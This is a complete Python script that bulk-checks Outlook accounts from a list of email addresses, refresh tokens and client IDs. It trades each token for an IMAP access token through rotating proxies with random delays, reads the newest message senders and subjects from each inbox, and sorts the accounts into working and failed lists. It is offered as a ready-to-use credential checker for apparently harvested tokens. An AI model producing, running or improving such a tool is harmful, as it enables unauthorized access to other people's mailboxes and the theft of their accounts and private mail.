import requests
import imaplib
import email
import random
import time
import threading
from concurrent.futures import ThreadPoolExecutor

ACCOUNTS_FILE = "accounts.txt"
PROXIES_FILE = "proxies.txt"

lock = threading.Lock()


def load_file(name):
    with open(name, "r", encoding="utf-8") as f:
        return [x.strip() for x in f if x.strip()]


accounts = load_file(ACCOUNTS_FILE)
proxies = load_file(PROXIES_FILE)


def save_result(file, text):
    with lock:
        with open(file, "a", encoding="utf-8") as f:
            f.write(text + "\n")


def get_proxy():
    return random.choice(proxies)


def get_access_token(client_id, refresh_token, proxy):

    proxy_dict = {
        "http": proxy,
        "https": proxy
    }

    try:
        r = requests.post(
            "https://login.microsoftonline.com/common/oauth2/v2.0/token",
            data={
                "client_id": client_id,
                "refresh_token": refresh_token,
                "grant_type": "refresh_token",
                "scope": "https://outlook.office.com/IMAP.AccessAsUser.All offline_access",
            },
            proxies=proxy_dict,
            timeout=25
        )

        if r.status_code != 200:
            return None

        return r.json().get("access_token")

    except:
        return None


def check_mail(acc):

    email_addr, refresh, client = acc.split("|")

    proxy = get_proxy()

    print(f"Checking {email_addr} | proxy {proxy}")

    token = get_access_token(client, refresh, proxy)

    if not token:
        save_result("bad.txt", acc)
        return

    try:

        auth_string = f"user={email_addr}\1auth=Bearer {token}\1\1"

        imap = imaplib.IMAP4_SSL("outlook.office365.com")
        imap.authenticate("XOAUTH2", lambda _: auth_string)
        imap.select("INBOX")

        typ, data = imap.search(None, "ALL")

        if data[0]:

            ids = data[0].split()[-3:]

            for num in ids:

                typ, msg_data = imap.fetch(num, "(RFC822)")
                msg = email.message_from_bytes(msg_data[0][1])

                subject = msg.get("Subject")
                sender = msg.get("From")

                print(email_addr, "|", sender, "|", subject)

        imap.logout()

        save_result("good.txt", acc)

    except:
        save_result("bad.txt", acc)

    time.sleep(random.uniform(3, 10))


def main():

    threads = 10

    with ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(check_mail, accounts)


if __name__ == "__main__":
    main()